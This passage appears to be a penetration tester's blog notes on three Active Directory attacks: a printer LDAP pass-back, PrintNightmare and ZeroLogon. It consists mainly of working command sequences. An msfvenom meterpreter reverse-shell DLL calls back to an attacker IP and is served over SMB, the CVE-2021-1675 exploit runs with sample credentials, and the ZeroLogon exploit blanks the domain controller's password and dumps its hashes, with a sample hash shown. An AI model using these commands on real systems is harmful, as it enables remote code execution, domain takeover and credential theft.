+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXYXQ1efll7IgW_KJHBYFTOYCNrZSM88f1NSWP8HqPH8RETdS8HLW4WsnmOVTKd2cqriO_rAaVVDGsnQZuXFt1858TxSp9AG6tH1nwjWtS0cXBjDlrOD6aKuArPJxCVkx_jb5P2ifcUpc1CSXvSsFTjpRgZauDpzxT9yhWBXKQUQXBWCcCIE1pDSaa/s1600/MSFForGPP.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="733" data-original-width="1333" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXYXQ1efll7IgW_KJHBYFTOYCNrZSM88f1NSWP8HqPH8RETdS8HLW4WsnmOVTKd2cqriO_rAaVVDGsnQZuXFt1858TxSp9AG6tH1nwjWtS0cXBjDlrOD6aKuArPJxCVkx_jb5P2ifcUpc1CSXvSsFTjpRgZauDpzxT9yhWBXKQUQXBWCcCIE1pDSaa/s1600/MSFForGPP.png"/></a></div>
+
+<h2>13. Passback Attack</h2>
+
+<div class="separator" style="clear: both; border: 1px solid black;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgILJPJuouMFqM0a8NZaHsIbus8OEoct_apS7Aw7SxTJ7tgYIlWCG4o7onZ-0h_GwIv6ameYeo6l0dIj3QMH5VsBMU62kptZIwL_k_0zigvMRaI5wRur8UHSsjQeEIf2ah0ntBwhsQ7VYJQHI5XtmqhcTZez0PuPf5iR-iZyqQD0GZ2yqGloDASjSe2/s1600/PrinterPassBack.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="1071" data-original-width="1445" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgILJPJuouMFqM0a8NZaHsIbus8OEoct_apS7Aw7SxTJ7tgYIlWCG4o7onZ-0h_GwIv6ameYeo6l0dIj3QMH5VsBMU62kptZIwL_k_0zigvMRaI5wRur8UHSsjQeEIf2ah0ntBwhsQ7VYJQHI5XtmqhcTZez0PuPf5iR-iZyqQD0GZ2yqGloDASjSe2/s1600/PrinterPassBack.png"/></a></div>
+
+<p>You can get a LDAP password through a printer setup. The **** password is unavailable, but not if you set the IP to yourself and set netcat as a listener port.</p>
+
+<p><a target="_blank" href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack">https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack</a></p>
+
+<h2>14. PrintNightmare Attack</h2>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMxk4u4eWXA8d_UfOYL5maWG3-KOnj36wKLZ74zNRQro1YOF2scQiBczDR3boOrxYAWyyI0HuXP51GHdOtd4VzN3sWC3WHtmuldIAY6FLqmzHpFuXIcLIsDdP5I1R28j3efWH8-T4R3hUDTRDaoMNoBsg_SMlH94aJFvMiogh13euqU55bbeO0B4cv/s1600/PrintNightMare.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="818" data-original-width="1599" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMxk4u4eWXA8d_UfOYL5maWG3-KOnj36wKLZ74zNRQro1YOF2scQiBczDR3boOrxYAWyyI0HuXP51GHdOtd4VzN3sWC3WHtmuldIAY6FLqmzHpFuXIcLIsDdP5I1R28j3efWH8-T4R3hUDTRDaoMNoBsg_SMlH94aJFvMiogh13euqU55bbeO0B4cv/s1600/PrintNightMare.png"/></a></div>
+
+<pre>
+rpcdump.py 192.168.200.221 | egrep 'MS-RPRN|MS-PAR' (If both options exist, server is vuln)
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.200.187 lport=5555 -f dll > shell.dll
+smbserver.py Share . -smb2support
+
+python3 CVE-2021-1675.py 'jessica:password123='@192.168.200.221 '\\192.168.200.187\Share\shell.dll'
+python3 CVE-2021-1675.py 'vulcan.local/annieh':'password123='@192.168.200.221 '\\192.168.200.187\Share\shell.dll'
+</pre>
+
+<p>The domain users haven't worked for me using this exploit. Could work on another box. Github: <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a> OR <a href="https://github.com/ly4k/PrintNightmare">https://github.com/ly4k/PrintNightmare</a></p>
+
+<h2>15. ZeroLogon Attack</h2>
+
+<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKm0zlILn6ciUhx2rKwbZnzslWNSW_3gcBH8VyR3wkVqk3kgVLYzfh0AYBA6DDwWL7q0LeWCe-bKIjgsQBA5Nt3xjGLvrwSOhfkSPaPafsd4vdmnRBOx6ZswZHFZl8jOsCZRWxEVCfGTGlqPg1XvzjjysHm2yb1oni79KxUKCRzYF144mHkZZopuC4/s1600/ZeroLoginCheck.png" style="display: block; padding: 1em 0; text-align: center; "><img alt="" border="0" data-original-height="304" data-original-width="1015" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKm0zlILn6ciUhx2rKwbZnzslWNSW_3gcBH8VyR3wkVqk3kgVLYzfh0AYBA6DDwWL7q0LeWCe-bKIjgsQBA5Nt3xjGLvrwSOhfkSPaPafsd4vdmnRBOx6ZswZHFZl8jOsCZRWxEVCfGTGlqPg1XvzjjysHm2yb1oni79KxUKCRzYF144mHkZZopuC4/s1600/ZeroLoginCheck.png"/></a></div>
+
+<p>CVE-2020-1472. Used to change Administrator password to nothing. Be careful and use as last resort. Checking can be good enough.</p>
+<pre>
+https://github.com/SecuraBV/CVE-2020-1472
+https://github.com/dirkjanm/CVE-2020-1472
+<pre>
+
+ZeroLogon CVE-2020-1472
+<pre>
+# Check Only
+python3 zerologon_tester.py SPOCK-DC 192.168.200.136
+# Exploit
+python cve-2020-1472-exploit.py SPOCK-DC 192.168.200.136
+impacket-secretsdump -just-dc VULCAN/SPOCK-DC\$@192.168.200.136
+
+# Restore
+impacket-secretsdump administrator@192.168.200.136 -hashes aad3b435b51404eeaad3b435b51404ee:8119935c5f7fa5f57135620c8073aaca 
+Look for plain_password_hex
+python restorepassword.py VULCAN/SPOCK-DC@SPOCK-DC -target-ip 192.168.200.136 -hexpass
+(everything after plain_password_hex)
+</pre>
